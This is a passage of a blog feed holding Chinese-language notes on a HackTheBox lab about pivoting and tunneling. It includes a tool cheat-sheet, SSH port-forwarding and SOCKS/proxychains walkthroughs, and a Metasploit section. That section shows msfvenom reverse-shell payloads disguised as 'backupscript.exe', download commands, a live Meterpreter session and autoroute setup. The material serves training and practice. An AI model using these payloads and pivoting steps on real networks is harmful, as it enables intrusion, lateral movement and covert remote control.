cmd</code>).</td></tr><tr><td><code>dnscat2&gt; ?</code></td><td>Used to list dnscat2 options.</td></tr><tr><td><code>dnscat2&gt; window -i 1</code></td><td>Used to interact with an established dnscat2 session.</td></tr><tr><td><code>./chisel server -v -p 1234 --socks5</code></td><td>Used to start a chisel server in verbose mode listening on port <code>1234</code> using SOCKS version 5.</td></tr><tr><td><code>./chisel client -v 10.129.202.64:1234 socks</code></td><td>Used to connect to a chisel server at the specified IP address &amp; port using socks.</td></tr><tr><td><code>git clone https://github.com/utoni/ptunnel-ng.git</code></td><td>Clones the ptunnel-ng project GitHub repository.</td></tr><tr><td><code>sudo ./autogen.sh</code></td><td>Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.</td></tr><tr><td><code>sudo ./ptunnel-ng -r10.129.202.64 -R22</code></td><td>Used to start the ptunnel-ng server on the specified IP address (<code>-r</code>) and corresponding port (<code>-R22</code>).</td></tr><tr><td><code>sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</code></td><td>Used to connect to a specified ptunnel-ng server through local port 2222 (<code>-l2222</code>).</td></tr><tr><td><code>ssh -p2222 -lubuntu 127.0.0.1</code></td><td>SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.</td></tr><tr><td><code>regsvr32.exe SocksOverRDP-Plugin.dll</code></td><td>Windows-based command used to register the SocksOverRDP-PLugin.dll.</td></tr><tr><td>&#96;netstat -antb</td><td>findstr 1080&#96;</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Socat-Redirection-with-a-Reverse-Shell&quot;&gt;&lt;a href=&quot;#Socat-Redirection-with-a-Reverse-Shell&quot; class=&quot;headerlink&quot; title=&quot;Socat Redirectio</summary>
      
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Pivoting, Tunneling, and Port Forwarding-Choosing The Dig Site &amp; Starting Our Tunnels</title>
    <link href="https://taninluv.github.io/2023/08/27/Pivoting-Tunneling-and-Port-Forwarding/"/>
    <id>https://taninluv.github.io/2023/08/27/Pivoting-Tunneling-and-Port-Forwarding/</id>
    <published>2023-08-27T08:25:27.000Z</published>
    <updated>2023-08-29T11:48:29.362Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction-to-Pivoting-Tunneling-and-Port-Forwarding"><a href="#Introduction-to-Pivoting-Tunneling-and-Port-Forwarding" class="headerlink" title="Introduction to Pivoting, Tunneling, and Port Forwarding"></a>Introduction to Pivoting, Tunneling, and Port Forwarding</h1><p><img src="https://academy.hackthebox.com/storage/modules/158/PivotingandTunnelingVisualized.gif" alt="img"></p><p>在红队参与、渗透测试或Active Directory评估期间，我们经常会发现自己可能已经泄露了移动到另一台主机所需的凭据、ssh密钥、哈希或访问令牌，但可能没有其他主机可以从我们的攻击主机直接访问。在这种情况下，我们可能需要使用一个我们已经妥协的枢轴主机来找到通往下一个目标的方法。第一次登录主机时，最重要的事情之一是检查我们的权限级别、网络连接以及潜在的VPN或其他远程访问软件。如果一台主机有多个网络适配器，我们可能会使用它来移动到不同的网段。Pivoting本质上是指通过受损的主机转移到其他网络，在不同的网段上找到更多目标。</p><span id="more"></span><p>有许多不同的术语用于描述受损主机，我们可以使用这些术语来转向以前无法访问的网段。最常见的有：</p><ul><li><code>Pivot Host</code></li><li><code>Proxy</code></li><li><code>Foothold</code></li><li><code>Beach Head system</code></li><li><code>Jump Host</code></li></ul><p>Pivoting的主要用途是击败分段（物理和虚拟）来访问孤立的网络。另一方面，隧道是枢转的一个子集。隧道将网络流量封装到另一个协议中，并通过它路由流量。</p><p>像VPN或专用浏览器这样的典型应用程序只是隧道网络流量的另一种形式。 在IT和Infosec行业，我们不可避免地会遇到几个不同的术语来描述同一件事。通过旋转，我们会注意到这通常被称为横向运动。</p><h2 id="Lateral-Movement-Pivoting-and-Tunneling-Compared"><a href="#Lateral-Movement-Pivoting-and-Tunneling-Compared" class="headerlink" title="Lateral Movement, Pivoting, and Tunneling Compared"></a>Lateral Movement, Pivoting, and Tunneling Compared</h2><h4 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h4><p>横向移动可以被描述为一种用于在网络环境中进一步访问额外主机、应用程序和服务的技术。横向移动还可以帮助我们获得提升特权所需的特定领域资源。横向移动通常允许主机之间的权限升级。除了我们对这一概念的解释外，我们还可以研究其他受人尊敬的组织如何解释横向运动。如果时间允许，请查看以下两种解释：</p><p><a href="https://www.paloaltonetworks.com/cyberpedia/what-is-lateral-movement">Palo Alto Network’s Explanation</a></p><p><a href="https://attack.mitre.org/tactics/TA0008/">MITRE’s Explanation</a></p><h4 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h4><p>利用多个主机来跨越通常无法访问的网络边界。这是一个更有针对性的目标。这里的目标是通过损害目标主机或基础设施，使我们能够深入网络。</p><h4 id="Tunneling"><a href="#Tunneling" class="headerlink" title="Tunneling"></a>Tunneling</h4><p>我们经常发现自己使用各种协议来将流量穿梭于有可能检测到流量的网络中。例如，使用HTTP来屏蔽从我们拥有的服务器到受害者主机的命令和控制流量。这里的关键是混淆我们的行动，以尽可能长时间地避免被发现。我们使用具有增强安全措施的协议，如TLS上的HTTPS或其他传输协议上的SSH。这些类型的操作还可以实现诸如将数据从目标网络中过滤出来或将更多有效载荷和指令传递到网络中之类的策略。</p><h1 id="The-Networking-Behind-Pivoting"><a href="#The-Networking-Behind-Pivoting" class="headerlink" title="The Networking Behind Pivoting"></a>The Networking Behind Pivoting</h1><h2 id="IP-Addressing-amp-NICs"><a href="#IP-Addressing-amp-NICs" class="headerlink" title="IP Addressing &amp; NICs"></a>IP Addressing &amp; NICs</h2><h2 id="Routing"><a href="#Routing" class="headerlink" title="Routing"></a>Routing</h2><p>路由器的一个关键定义特征是它有一个路由表，用于根据目的地IP地址转发流量。我们在Pwnbox上使用命令netstat-r或ip route来查看这一点。</p><p>被指定为路由器的独立设备通常会使用静态路由创建、动态路由协议和直接连接接口的组合来学习路由。任何去往路由表中不存在的网络的流量都将被发送到默认路由，该路由也可以被称为默认网关或最后的网关。在寻找转向机会时，查看主机的路由表以确定我们可能能够到达的网络或我们可能需要添加的路由可能会很有帮助。</p><h2 id="Protocols-Services-amp-Ports"><a href="#Protocols-Services-amp-Ports" class="headerlink" title="Protocols, Services &amp; Ports"></a>Protocols, Services &amp; Ports</h2><p>可以尝试使用网络绘图工具绘制网络拓扑。当我寻找转向的机会时，我喜欢使用<a href="https://draw.io/">Draw.io</a>等工具来构建我所处网络环境的可视化，它也是一个很好的文档工具</p><h1 id="Dynamic-Port-Forwarding-with-SSH-and-SOCKS-Tunneling"><a href="#Dynamic-Port-Forwarding-with-SSH-and-SOCKS-Tunneling" class="headerlink" title="Dynamic Port Forwarding with SSH and SOCKS Tunneling"></a>Dynamic Port Forwarding with SSH and SOCKS Tunneling</h1><hr><h2 id="Port-Forwarding-in-Context"><a href="#Port-Forwarding-in-Context" class="headerlink" title="Port Forwarding in Context"></a>Port Forwarding in Context</h2><p>端口转发是一种允许我们将通信请求从一个端口重定向到另一个端口的技术。端口转发使用TCP作为主要通信层，为转发的端口提供交互式通信。然而，可以使用不同的应用层协议，如SSH甚至SOCKS（非应用层）来封装转发的流量。这可以有效绕过防火墙，并使用受损主机上的现有服务转向其他网络。</p><h2 id="SSH-Local-Port-Forwarding"><a href="#SSH-Local-Port-Forwarding" class="headerlink" title="SSH Local Port Forwarding"></a>SSH Local Port Forwarding</h2><p>让我们从下图中举一个例子。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291121798.png" alt="img"></p><p>我们有一个攻击主机（10.10.15.x）和一个目标Ubuntu服务器（10.129.x.x），我们已经破坏了它。我们将使用Nmap扫描目标Ubuntu服务器以搜索打开的端口。</p><h4 id="Scanning-the-Pivot-Target"><a href="#Scanning-the-Pivot-Target" class="headerlink" title="Scanning the Pivot Target"></a>Scanning the Pivot Target</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -sT -p22,3306 10.129.202.64Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 ESTNmap scan report for 10.129.202.64Host is up (0.12s latency).PORT     STATE  SERVICE22/tcp   open   ssh3306/tcp closed mysqlNmap done: 1 IP address (1 host up) scanned in 0.68 seconds</code></pre><p>Nmap输出显示SSH端口已打开。要访问MySQL服务，我们可以通过SSH连接到服务器并从Ubuntu服务器内部访问MySQL，也可以通过端口1234将其转发到本地主机并在本地访问。在本地访问它的一个好处是，如果我们想在MySQL服务上执行远程攻击，如果没有端口转发，我们将无法做到这一点。这是由于MySQL在端口3306的Ubuntu服务器上本地托管。因此，我们将使用以下命令通过SSH将本地端口（1234）转发到Ubuntu服务器。</p><h4 id="Executing-the-Local-Port-Forward"><a href="#Executing-the-Local-Port-Forward" class="headerlink" title="Executing the Local Port Forward"></a>Executing the Local Port Forward</h4><pre><code class="shell-session">Tanin@htb[/htb]$ netstat -antp | grep 1234</code></pre><h4 id="Confirming-Port-Forward-with-Nmap"><a href="#Confirming-Port-Forward-with-Nmap" class="headerlink" title="Confirming Port Forward with Nmap"></a>Confirming Port Forward with Nmap</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -v -sV -p1234 localhost</code></pre><p>类似地，如果我们想将多个端口从Ubuntu服务器转发到本地主机，可以通过在ssh命令中包含localport:server:port参数来实现。例如，下面的命令将apache web服务器的端口80转发到8080上的攻击主机的本地端口。</p><h4 id="Forwarding-Multiple-Ports"><a href="#Forwarding-Multiple-Ports" class="headerlink" title="Forwarding Multiple Ports"></a>Forwarding Multiple Ports</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64</code></pre><h2 id="Setting-up-to-Pivot"><a href="#Setting-up-to-Pivot" class="headerlink" title="Setting up to Pivot"></a>Setting up to Pivot</h2><p>现在，如果你在Ubuntu主机上键入ifconfig，你会发现这台服务器有多个NIC： 一个连接到我们的攻击主机（ens192） 一个与不同网络内的其他主机通信（ens224） 环回接口（lo）。</p><h4 id="Looking-for-Opportunities-to-Pivot-using-ifconfig"><a href="#Looking-for-Opportunities-to-Pivot-using-ifconfig" class="headerlink" title="Looking for Opportunities to Pivot using ifconfig"></a>Looking for Opportunities to Pivot using ifconfig</h4><pre><code class="shell-session">ubuntu@WEB01:~$ ifconfig ens192: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)        RX packets 35571  bytes 177919049 (177.9 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 10452  bytes 1474767 (1.4 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0ens224: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)        RX packets 8251  bytes 1125190 (1.1 MB)        RX errors 0  dropped 40  overruns 0  frame 0        TX packets 1538  bytes 123584 (123.5 KB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1000  (Local Loopback)        RX packets 270  bytes 22432 (22.4 KB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 270  bytes 22432 (22.4 KB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><p>与之前我们知道要访问哪个端口的情况不同，在当前的情况下，我们不知道网络的另一端有哪些服务。因此，我们可以扫描网络（172.16.5.1-200）网络或整个子网（172.16.5.0&#x2F;23）上较小范围的IP。我们无法直接从攻击主机执行此扫描，因为它没有到172.16.5.0&#x2F;22网络的路由。要做到这一点，我们必须通过Ubuntu服务器执行动态端口转发和调整网络数据包。我们可以通过在本地主机（个人攻击主机或Pwnbox）上启动SOCKS侦听器来实现这一点，然后配置SSH，以便在连接到目标主机后通过SSH将该流量转发到网络（172.16.5.0&#x2F;23）。 这称为通过SOCKS代理的SSH隧道。SOCKS代表Socket Secure，这是一种有助于与有防火墙限制的服务器通信的协议。与大多数情况下启动连接以连接到服务不同，在SOCKS的情况下，初始流量由SOCKS客户端生成，该客户端连接到由想要访问客户端上的服务的用户控制的SOCKS服务器。一旦建立了连接，就可以代表连接的客户端通过SOCKS服务器路由网络流量。 这种技术通常用于规避防火墙的限制，并允许外部实体绕过防火墙，访问防火墙环境中的服务。使用SOCKS代理进行数据透视和转发的另一个好处是，SOCKS代理可以通过创建从NAT网络到外部服务器的路由进行透视。SOCKS代理目前有两种类型：SOCKS4和SOCKS5。SOCKS4不提供任何身份验证和UDP支持，而SOCKS5提供了这些支持。让我们举一个下图的例子，我们有一个172.16.5.0&#x2F;23的NAT网络，我们不能直接访问它。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291135490.png" alt="img"></p><p>在上图中，攻击主机启动SSH客户端，并请求SSH服务器允许其通过SSH套接字发送一些TCP数据。SSH服务器以确认进行响应，然后SSH客户端开始在localhost:9050上侦听。您在此处发送的任何数据都将通过SSH广播到整个网络（172.16.5.0&#x2F;23）。我们可以使用以下命令来执行此动态端口转发。</p><h4 id="Enabling-Dynamic-Port-Forwarding-with-SSH"><a href="#Enabling-Dynamic-Port-Forwarding-with-SSH" class="headerlink" title="Enabling Dynamic Port Forwarding with SSH"></a>Enabling Dynamic Port Forwarding with SSH</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64</code></pre><p>-D参数请求SSH服务器启用动态端口转发。一旦我们启用了这一功能，我们将需要一个可以通过端口9050路由任何工具的数据包的工具。我们可以使用proxychains工具来实现这一点，该工具能够通过TOR、SOCKS和HTTP&#x2F;HTTPS代理服务器重定向TCP连接，还允许我们将多个代理服务器链接在一起。使用proxychains，我们也可以隐藏请求主机的IP地址，因为接收主机只能看到透视主机的IP。Proxychains通常用于强制应用程序的TCP流量通过托管代理，如SOCKS4&#x2F;SOCKS5、TOR或HTTP&#x2F;HTTPS代理。 要通知proxychans我们必须使用端口9050，我们必须修改位于&#x2F;etc&#x2F;proxychans.conf的proxychans配置文件。如果最后一行还没有socks4 127.0.0.1 9050，那么我们可以将其添加到最后一行。</p><pre><code class="shell-session">Tanin@htb[/htb]$ tail -4 /etc/proxychains.conf# meanwile# defaults set to &quot;tor&quot;socks4 127.0.0.1 9050</code></pre><p>现在，当您使用以下命令使用proxychains启动Nmap时，它将把Nmap的所有数据包路由到本地端口9050，我们的SSH客户端正在侦听该端口，该端口将通过SSH将所有数据包转发到172.16.5.0&#x2F;23网络。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200</code></pre><p>使用proxychains打包所有Nmap数据并将其转发到远程服务器的这一部分称为SOCKS隧道。这里需要记住的一个更重要的注意事项是，我们只能在proxychain上执行完整的TCP连接扫描。原因是代理主机无法理解部分数据包。如果发送部分数据包（如半连接扫描），则会返回不正确的结果。我们还需要确保意识到主机活动检查可能无法针对Windows目标，因为Windows Defender防火墙默认情况下会阻止ICMP请求（传统ping）。 在整个网络范围内不进行ping的完整TCP连接扫描将花费很长时间。因此，对于本模块，我们将主要关注扫描单个主机，或我们知道的活动的较小范围的主机，在这种情况下，它将是172.16.5.19的Windows主机。 我们将使用以下命令执行远程系统扫描。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap -v -Pn -sT 172.16.5.19</code></pre><p>Nmap扫描显示了几个打开的端口，其中一个是RDP端口（3389）。与Nmap扫描类似，我们还可以通过proxychans调整msfconsole，使用Metasploit辅助模块执行易受攻击的RDP扫描。我们可以用proxychains启动msfconsole。</p><h2 id="Using-Metasploit-with-Proxychains"><a href="#Using-Metasploit-with-Proxychains" class="headerlink" title="Using Metasploit with Proxychains"></a>Using Metasploit with Proxychains</h2><p>我们还可以使用proxychains打开Metasploit，并通过我们建立的代理发送所有相关流量。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains msfconsole</code></pre><p>让我们使用rdp_scanner辅助模块来检查内部网络上的主机是否正在监听3389。</p><pre><code class="shell-session">msf6 &gt; search rdp_scannerrun：[*] 172.16.5.19:3389      - Detected RDP on 172.16.5.19:3389      (name:DC01) (domain:INLANEFREIGHT) main_fqdn:inlanefreight.local) (server_fqdn:DC01.inlanefreight.local) (os_version:10.0.17763) (RequirNLA: No)[*] 172.16.5.19:3389      - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><p>在上面输出的底部，我们可以看到RDP端口与Windows操作系统版本一起打开。 根据评估期间我们对此主机的访问级别，我们可能会尝试运行漏洞攻击或使用收集的凭据登录。对于此模块，我们将通过SOCKS隧道登录到Windows远程主机。这可以使用xfreerdp来完成。我们案例中的用户是胜利者，密码是pass@123</p><h4 id="Using-xfreerdp-with-Proxychains"><a href="#Using-xfreerdp-with-Proxychains" class="headerlink" title="Using xfreerdp with Proxychains"></a>Using xfreerdp with Proxychains</h4><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123</code></pre><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p>应用本节中教授的概念，转向内部网络并使用RDP（凭据：victor:pass@123)以控制172.16.5.19上的Windows目标。提交桌面上Flag.txt的内容。</p><p>这里使用ssh -D 然后配置proxychain代理就可以轻松连接，个人感觉ssh -L也可以，但是缺陷是只能指定某个端口映射，这可能导致当常用服务与其常用端口不匹配时，转发出去的端口</p><h1 id="Remote-x2F-Reverse-Port-Forwarding-with-SSH"><a href="#Remote-x2F-Reverse-Port-Forwarding-with-SSH" class="headerlink" title="Remote&#x2F;Reverse Port Forwarding with SSH"></a>Remote&#x2F;Reverse Port Forwarding with SSH</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291509662.png" alt="img"></p><p>如果我们试图获得一个反向外壳，会发生什么呢？ Windows主机的传出连接仅限于172.16.5.0&#x2F;23网络。这是因为Windows主机与攻击主机所在的网络没有任何直接连接。如果我们在攻击主机上启动Metasploit侦听器并尝试获取反向shell，我们将无法在此处获得直接连接，因为Windows服务器不知道如何路由离开其网络（172.16.5.0&#x2F;23）的流量以到达10.129.x.x（Academy Lab网络）。 在渗透测试过程中，有几次只有远程桌面连接是不可行的。您可能需要上载&#x2F;下载文件（当RDP剪贴板被禁用时），使用漏洞利用或低级Windows API使用Metermeter会话在Windows主机上执行枚举，而使用内置的Windows可执行文件是不可能的。 在这些情况下，我们必须找到一个枢轴主机，这是我们的攻击主机和Windows服务器之间的常见连接点。在我们的案例中，我们的中枢主机将是Ubuntu服务器，因为它可以连接到我们的攻击主机和Windows目标。为了在Windows上获得Meterpeter外壳，我们将使用msfvenom创建MeterpeterHTTPS负载，但负载的反向连接配置为Ubuntu服务器的主机IP地址（172.16.5.129）。我们将使用Ubuntu服务器上的端口8080将所有反向数据包转发到攻击主机的8000端口，Metasploit侦听器正在该端口运行。</p><h4 id="Creating-a-Windows-Payload-with-msfvenom"><a href="#Creating-a-Windows-Payload-with-msfvenom" class="headerlink" title="Creating a Windows Payload with msfvenom"></a>Creating a Windows Payload with msfvenom</h4><pre><code class="shell-session"> msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></pre><h4 id="Configuring-amp-Starting-the-multi-x2F-handler"><a href="#Configuring-amp-Starting-the-multi-x2F-handler" class="headerlink" title="Configuring &amp; Starting the multi&#x2F;handler"></a>Configuring &amp; Starting the multi&#x2F;handler</h4><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_httpspayload =&gt; windows/x64/meterpreter/reverse_httpsmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0lhost =&gt; 0.0.0.0msf6 exploit(multi/handler) &gt; set lport 8000lport =&gt; 8000msf6 exploit(multi/handler) &gt; run[*] Started HTTPS reverse handler on https://0.0.0.0:8000</code></pre><p>一旦创建了有效负载，并且配置并运行了侦听器，我们就可以使用scp命令将有效负载复制到Ubuntu服务器，因为我们已经有了使用SSH连接到Ubuntu服务器的凭据。</p><pre><code class="shell-session">Tanin@htb[/htb]$ scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/backupscript.exe                                   100% 7168    65.4KB/s   00:00 </code></pre><p>复制有效负载后，我们将在复制有效负载的同一目录中的Ubuntu服务器上使用以下命令启动python3HTTP服务器。</p><h4 id="Starting-Python3-Webserver-on-Pivot-Host"><a href="#Starting-Python3-Webserver-on-Pivot-Host" class="headerlink" title="Starting Python3 Webserver on Pivot Host"></a>Starting Python3 Webserver on Pivot Host</h4><pre><code class="shell-session">ubuntu@Webserver$ python3 -m http.server 8123</code></pre><h4 id="Downloading-Payload-from-Windows-Target"><a href="#Downloading-Payload-from-Windows-Target" class="headerlink" title="Downloading Payload from Windows Target"></a>Downloading Payload from Windows Target</h4><p>我们可以通过web浏览器或PowerShell cmdlet Invoke-WebRequest从Windows主机下载此备份脚本.exe。</p><pre><code class="powershell-session">PS C:\Windows\system32&gt; Invoke-WebRequest -Uri &quot;http://172.16.5.129:8123/backupscript.exe&quot; -OutFile &quot;C:\backupscript.exe&quot;</code></pre><p>一旦我们在Windows主机上下载了负载，我们将使用SSH远程端口转发将msfconsole在8000端口上的侦听器服务转发到Ubuntu服务器的8080端口。我们将在SSH命令中使用-vN参数，使其变得详细，并要求它不要提示登录shell。-R命令要求Ubuntu服务器侦听<targetIPaddress>:8080，并将端口8080上的所有传入连接转发到我们攻击主机0.0.0.0:8000上的msfconsole侦听器。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN</code></pre><p>在创建SSH远程端口转发后，我们可以从Windows目标执行负载。如果有效负载按预期执行并尝试连接回侦听器，我们可以在pivot主机上看到来自pivot的日志。</p><p>如果一切设置正确，我们将通过Ubuntu服务器收到一个Meterpeter shell。</p><h4 id="Meterpreter-Session-Established"><a href="#Meterpreter-Session-Established" class="headerlink" title="Meterpreter Session Established"></a>Meterpreter Session Established</h4><pre><code class="shell-session">[*] Started HTTPS reverse handler on https://0.0.0.0:8000[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work![*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work![*] Meterpreter session 1 opened (127.0.0.1:8000 -&gt; 127.0.0.1 ) at 2022-03-02 10:48:10 -0500meterpreter &gt; shellProcess 3236 created.Channel 1 created.Microsoft Windows [Version 10.0.17763.1637](c) 2018 Microsoft Corporation. All rights reserved.C:\&gt;</code></pre><p>Meterpeter会话应该列出我们的传入连接来自本地主机本身（127.0.0.1），因为我们通过本地SSH套接字接收连接，该套接字创建了到Ubuntu服务器的出站连接。发出netstat命令可以向我们显示传入连接来自SSH服务。 下面的图形表示提供了理解该技术的另一种方式。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291516188.png" alt="img"></p><pre><code class="powershell-session"> Invoke-WebRequest -Uri &quot;http://10.129.147.31:8123/backdoor.exe&quot; -OutFile &quot;C:\backdoor&quot;</code></pre><h1 id="Meterpreter-Tunneling-amp-Port-Forwarding"><a href="#Meterpreter-Tunneling-amp-Port-Forwarding" class="headerlink" title="Meterpreter Tunneling &amp; Port Forwarding"></a>Meterpreter Tunneling &amp; Port Forwarding</h1><h4 id="Creating-Payload-for-Ubuntu-Pivot-Host"><a href="#Creating-Payload-for-Ubuntu-Pivot-Host" class="headerlink" title="Creating Payload for Ubuntu Pivot Host"></a>Creating Payload for Ubuntu Pivot Host</h4><pre><code class="shell-session">Tanin@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080</code></pre><p>在复制有效负载之前，我们可以启动一个 <a href="https://www.rapid7.com/db/modules/exploit/multi/handler/">multi&#x2F;handler</a>，也称为GenericPayloadHandler。</p><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler</code></pre><p>我们可以通过SSH将备份作业二进制文件复制到Ubuntu pivot主机，并执行它以获得Meterpeter会话。</p><p>我们需要确保在执行有效载荷时成功建立MeterMeter会话。</p><h4 id="Meterpreter-Session-Establishment"><a href="#Meterpreter-Session-Establishment" class="headerlink" title="Meterpreter Session Establishment"></a>Meterpreter Session Establishment</h4><p>我们知道Windows目标位于172.16.5.0&#x2F;23网络上。因此，假设Windows目标上的防火墙允许ICMP请求，我们希望在此网络上执行ping扫描。我们可以使用带有ping_sweep模块的Meterpeter来实现这一点，该模块将生成从Ubuntu主机到网络的ICMP流量172.16.5.0&#x2F;23。</p><h4 id="Ping-Sweep"><a href="#Ping-Sweep" class="headerlink" title="Ping Sweep"></a>Ping Sweep</h4><pre><code class="shell-session">meterpreter &gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23[*] Performing ping sweep for IP range 172.16.5.0/23</code></pre><p>我们还可以直接在目标枢轴主机上使用for循环执行ping扫描，该主机将ping我们指定的网络范围内的任何设备。这里有两个有用的ping扫描循环一行，我们可以用于基于Linux和基于Windows的枢轴主机。</p><pre><code class="shell-session">for i in &#123;1..254&#125; ;do (ping -c 1 172.16.5.$i | grep &quot;bytes from&quot; &amp;) ;done</code></pre><pre><code class="cmd-session">for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find &quot;Reply&quot;</code></pre><pre><code class="powershell-session">1..254 | % &#123;&quot;172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)&quot;&#125;</code></pre><p>注意：ping扫描可能不会在第一次尝试时成功回复，尤其是在跨网络通信时。这可能是由主机构建其arp缓存所需的时间造成的。在这些情况下，最好尝试至少两次ping扫描，以确保构建arp缓存。</p><p>在某些情况下，主机的防火墙会阻止ping（ICMP），而ping不会成功回复我们。在这些情况下，我们可以使用Nmap在172.16.5.0&#x2F;23网络上执行TCP扫描。我们还可以使用Metasploit的漏洞利用后路由模块socks_proxy在攻击主机上配置本地代理，而不是使用SSH进行端口转发。我们将为SOCKS版本4a配置SOCKS代理。此SOCKS配置将在端口9050上启动一个侦听器，并路由通过MeterMeter会话接收的所有流量。</p><h4 id="Configuring-MSF’s-SOCKS-Proxy"><a href="#Configuring-MSF’s-SOCKS-Proxy" class="headerlink" title="Configuring MSF’s SOCKS Proxy"></a>Configuring MSF’s SOCKS Proxy</h4><pre><code class="shell-session">msf6 &gt; use auxiliary/server/socks_proxy</code></pre><pre><code class="shell-session">msf6 auxiliary(server/socks_proxy) &gt; set SRVPORT 9050SRVPORT =&gt; 9050msf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 0.0.0.0SRVHOST =&gt; 0.0.0.0msf6 auxiliary(server/socks_proxy) &gt; set version 4aversion =&gt; 4amsf6 auxiliary(server/socks_proxy) &gt; run[*] Auxiliary module running as background job 0.[*] Starting the SOCKS proxy servermsf6 auxiliary(server/socks_proxy) &gt; optionsModule options (auxiliary/server/socks_proxy):   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   SRVHOST  0.0.0.0          yes       The address to listen on   SRVPORT  9050             yes       The port to listen on   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,                                        5)Auxiliary action:   Name   Description   ----   -----------   Proxy  Run a SOCKS proxy server</code></pre><h4 id="Confirming-Proxy-Server-is-Running"><a href="#Confirming-Proxy-Server-is-Running" class="headerlink" title="Confirming Proxy Server is Running"></a>Confirming Proxy Server is Running</h4><pre><code class="shell-session">msf6 auxiliary(server/socks_proxy) &gt; jobsJobs====  Id  Name                           Payload  Payload opts  --  ----                           -------  ------------  0   Auxiliary: server/socks_proxy</code></pre><p>在启动SOCKS服务器后，我们将配置proxychans，通过我们在受损的Ubuntu主机上的枢轴来路由其他工具（如Nmap）生成的流量。如果还没有，我们可以在&#x2F;etc&#x2F;proxychain.conf的proxychain.onf文件的末尾添加以下行。</p><pre><code class="shell-session">socks4 127.0.0.1 9050</code></pre><p>注意：根据SOCKS服务器运行的版本，我们可能偶尔需要在proxyains.conf中将socks4更改为socks5。</p><h4 id="Creating-Routes-with-AutoRoute"><a href="#Creating-Routes-with-AutoRoute" class="headerlink" title="Creating Routes with AutoRoute"></a>Creating Routes with AutoRoute</h4><pre><code class="shell-session">msf6 &gt; use post/multi/manage/autoroutemsf6 post(multi/manage/autoroute) &gt; set SESSION 1SESSION =&gt; 1msf6 post(multi/manage/autoroute) &gt; set SUBNET 172.16.5.0SUBNET =&gt; 172.16.5.0msf6 post(multi/manage/autoroute) &gt; run</code></pre><p>也可以通过从MeterMeter会话运行自动路由来添加具有自动路由的路由。</p><pre><code class="shell-session">meterpreter 